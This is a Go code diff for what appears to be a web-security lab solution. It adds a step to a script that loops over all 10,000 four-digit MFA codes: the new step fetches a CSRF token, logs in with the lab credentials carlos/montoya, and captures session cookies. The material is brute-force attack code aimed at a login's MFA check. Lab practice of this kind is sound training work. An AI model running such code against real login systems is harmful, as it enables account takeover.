@@ -5,6 +5,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"net/url"
 	"regexp"
 )
 
@@ -20,22 +21,24 @@ func solve(hostname string) {
 	for mfaCode := 0; mfaCode < 10000; mfaCode++ {
 		csrfToken := firstStep(hostname)
 		log.Printf("CSRF Token from first step: %s", csrfToken)
+		cookies := secondStep(hostname, csrfToken)
+		log.Printf("Cookies from second step: %s", cookies)
 	}
 }
 
 func firstStep(hostname string) string {
 	// GET /login -- asserts 200 and retrieve csrf token
 	uri := fmt.Sprintf("%s/login", hostname)
-	resp, err := http.Get(uri)
 
+	resp, err := http.Get(uri)
 	if err != nil {
 		log.Printf("Something not right when doing the request from the first step...")
 		return "something"
 	}
 
 	defer resp.Body.Close()
-	responseBody, err := io.ReadAll(resp.Body)
 
+	responseBody, err := io.ReadAll(resp.Body)
 	if err != nil {
 		log.Printf("Something not right when processing the request from the first step...")
 	}
@@ -46,6 +49,26 @@ func firstStep(hostname string) string {
 	rs := rgx.FindStringSubmatch(bodyAsString)
 
 	return rs[1]
+}
+
+func secondStep(hostname string, csrfToken string) []*http.Cookie {
+	// POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+	uri := fmt.Sprintf("%s/login", hostname)
+
+	resp, err := client.PostForm(
+		uri,
+		url.Values{"csrf": {csrfToken}, "username": {"carlos"}, "password": {"montoya"}},
+	)
+	if err != nil {
+		log.Printf("Something not right when doing the request from the second step...")
+	}
+
+	return resp.Cookies()
 }
 
 func main() {
